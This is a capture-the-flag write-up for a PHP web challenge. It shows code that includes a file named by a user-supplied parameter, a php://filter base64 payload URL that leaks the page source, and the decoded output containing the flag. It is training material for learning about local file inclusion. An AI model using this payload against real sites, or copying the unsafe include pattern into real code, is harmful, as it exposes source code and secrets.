# leakysite (web, 100 points)

> Try to get source of main_page.

## Files:

```php
<?php
    if(isset($_GET['resource'])){
        include($_GET['resource'] . '.php');
    } else {
        header("Location: /index.php?resource=main_page");
    }
?>
```

- https://thecybercoopctf-leaky-site.chals.io/

## Solution:

Let's take a look at the website:

![main page](../assets/leakysite/leakysite.png)

Sounds like we need to exploit PHP filters somehow to get the flag. The PHP server tries to include a local file that we can specify, meaning that we can also put filters into it. Thus, we can attempt to base 64 encode the page:

`https://thecybercoopctf-leaky-site.chals.io/index.php?resource=php://filter/convert.base64-encode/resource=main_page`:

This gives us:

```
PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8dGl0bGU+TWFpbjwvdGl0bGU+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vdW5wa2cuY29tL0BjdGZkaW8vcGljb2Nzcy10aGVtZXNAMC4wLjMvZGlzdC9jc3MvcGljb3N0cmFwLm1pbi5jc3MiPgogICAgPC9oZWFkPgogICAgPGJvZHk+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIG15LTUiPgogICAgICAgICAgICA8aDM+VGhlcmUncyBhIGZsYWcgaGVyZSBidXQgaXQncyBpbiB0aGUgc291cmNlIGNvZGUuLi48L2gzPgogICAgICAgICAgICA8cD4KICAgICAgICAgICAgICAgIENhbiB5b3UgcHVsbCBpdCBvdXQ/CiAgICAgICAgICAgICAgICA8cHJlPgogICAgICAgICAgICAgICAgICAgIDw/cGhwIC8vICJmbGFnezBoX24wX3BocF95MHVyX2wzYWtpbmdfNGxsXzB2ZXJ9IiA/PgogICAgICAgICAgICAgICAgPC9wcmU+CiAgICAgICAgICAgICAgICBQSFAgaXMgcXVpdGUgd2VpcmQgYWJvdXQgZmlsdGVycyBJIGhlYXIuLi4KICAgICAgICAgICAgPC9wPgogICAgICAgIDwvZGl2PgogICAgPC9ib2R5Pgo8L2h0bWw+
```

and decoding the base64 gives us

```
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Main</title>
    <link rel="stylesheet" href="https://unpkg.com/@ctfdio/picocss-themes@0.0.3/dist/css/picostrap.min.css">
    </head>
    <body>
        <div class="container my-5">
            <h3>There's a flag here but it's in the source code...</h3>
            <p>
                Can you pull it out?
                <pre>
                    <?php // "flag{0h_n0_php_y0ur_l3aking_4ll_0ver}" ?>
                </pre>
                PHP is quite weird about filters I hear...
            </p>
        </div>
    </body>
</html>
```
